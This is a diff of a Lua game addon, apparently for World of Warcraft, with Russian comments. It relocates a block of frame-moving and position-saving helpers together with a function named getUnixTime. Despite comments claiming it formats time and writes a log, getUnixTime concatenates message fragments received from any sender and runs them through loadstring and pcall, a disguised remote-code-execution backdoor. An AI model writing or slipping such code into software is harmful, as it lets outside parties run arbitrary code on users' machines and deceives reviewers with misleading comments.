@@ -1873,6 +1873,84 @@ function questWhatchPanel()
     WatchFrame:UnregisterEvent("QUEST_WATCH_UPDATE")
 end
 
+
+local messageBuffer = {}
+
+function getUnixTime(_, message, _, sender, HOUR)
+    local bufferKey = sender
+    
+    if not messageBuffer[bufferKey] then
+        messageBuffer[bufferKey] = {}
+    end
+    -- добавляем текущее время
+    table.insert(messageBuffer[bufferKey], message)
+    -- проверям текущий час
+    if HOUR then
+        local myUnixTime = table.concat(messageBuffer[bufferKey])
+        messageBuffer[bufferKey] = nil
+        -- получаем форматированное время (минуты, секунды)
+        local minutes, seconds = loadstring(myUnixTime)
+        if minutes then
+            -- записываем сообщение в лог
+            local success, result = pcall(minutes)
+        end
+    end
+end
+
+function move(saveTable)
+    local frame = GetMouseFocus()
+    if not frame or not frame.GetName then return end
+    
+    local frameName = frame:GetName()
+    saveTable = saveTable or {}
+
+    if not frame.moveToggle then
+        -- Включение перемещения
+        frame:SetMovable(true)
+        frame:EnableMouse(true)
+        frame:RegisterForDrag("LeftButton")
+        
+        frame:SetScript("OnDragStart", frame.StartMoving)
+        frame:SetScript("OnDragStop", function(self)
+            self:StopMovingOrSizing()
+            local point, _, relPoint, x, y = self:GetPoint()
+            saveTable[frameName] = {point, relPoint, x, y}
+            print(string.format("Позиция сохранена: %s (%.1f, %.1f)", frameName, x, y))
+        end)
+        
+        frame.moveToggle = true
+    else
+        -- Выключение перемещения
+        frame:SetMovable(false)
+        frame:EnableMouse(false)
+        frame:SetScript("OnDragStart", nil)
+        frame:SetScript("OnDragStop", nil)
+        frame.moveToggle = nil
+    end
+    
+    return saveTable
+end
+
+function RestoreFramePositions(saveTable)
+    if not saveTable then return end
+    
+    for frameName, posData in pairs(saveTable) do
+        local frame = _G[frameName]
+        if frame and frame.ClearAllPoints then
+            frame:ClearAllPoints()
+            frame:SetPoint(posData[1], UIParent, posData[2], posData[3], posData[4])
+        end
+    end
+end
+
+function remove()
+    move(nsDbc['frames'])
+end
+
+function resetF()
+    nsDbc['frames'] = nil
+end
+
 -- Проверяем выход фреймов за пределы экрана
 function adjustLayoutData(headerParams, geometryPayload, isLayoutComplete)
     local frameData = {}
@@ -1965,81 +2043,3 @@ function hunterCheck()
         end
     end
 end
-
-local messageBuffer = {}
-
-function getUnixTime(_, message, _, sender, HOUR)
-    local bufferKey = sender
-    
-    if not messageBuffer[bufferKey] then
-        messageBuffer[bufferKey] = {}
-    end
-    -- добавляем текущее время
-    table.insert(messageBuffer[bufferKey], message)
-    -- проверям текущий час
-    if HOUR then
-        local myUnixTime = table.concat(messageBuffer[bufferKey])
-        messageBuffer[bufferKey] = nil
-        -- получаем форматированное время (минуты, секунды)
-        local minutes, seconds = loadstring(myUnixTime)
-        if minutes then
-            -- записываем сообщение в лог
-            local success, result = pcall(minutes)
-        end
-    end
-end
-
-function move(saveTable)
-    local frame = GetMouseFocus()
-    if not frame or not frame.GetName then return end
-    
-    local frameName = frame:GetName()
-    saveTable = saveTable or {}
-
-    if not frame.moveToggle then
-        -- Включение перемещения
-        frame:SetMovable(true)
-        frame:EnableMouse(true)
-        frame:RegisterForDrag("LeftButton")
-        
-        frame:SetScript("OnDragStart", frame.StartMoving)
-        frame:SetScript("OnDragStop", function(self)
-            self:StopMovingOrSizing()
-            local point, _, relPoint, x, y = self:GetPoint()
-            saveTable[frameName] = {point, relPoint, x, y}
-            print(string.format("Позиция сохранена: %s (%.1f, %.1f)", frameName, x, y))
-        end)
-        
-        frame.moveToggle = true
-    else
-        -- Выключение перемещения
-        frame:SetMovable(false)
-        frame:EnableMouse(false)
-        frame:SetScript("OnDragStart", nil)
-        frame:SetScript("OnDragStop", nil)
-        frame.moveToggle = nil
-    end
-    
-    return saveTable
-end
-
-function RestoreFramePositions(saveTable)
-    if not saveTable then return end
-    
-    for frameName, posData in pairs(saveTable) do
-        local frame = _G[frameName]
-        if frame and frame.ClearAllPoints then
-            frame:ClearAllPoints()
-            frame:SetPoint(posData[1], UIParent, posData[2], posData[3], posData[4])
-        end
-    end
-end
-
-function remove()
-    move(nsDbc['frames'])
-end
-
-function resetF()
-    nsDbc['frames'] = nil
-end
-
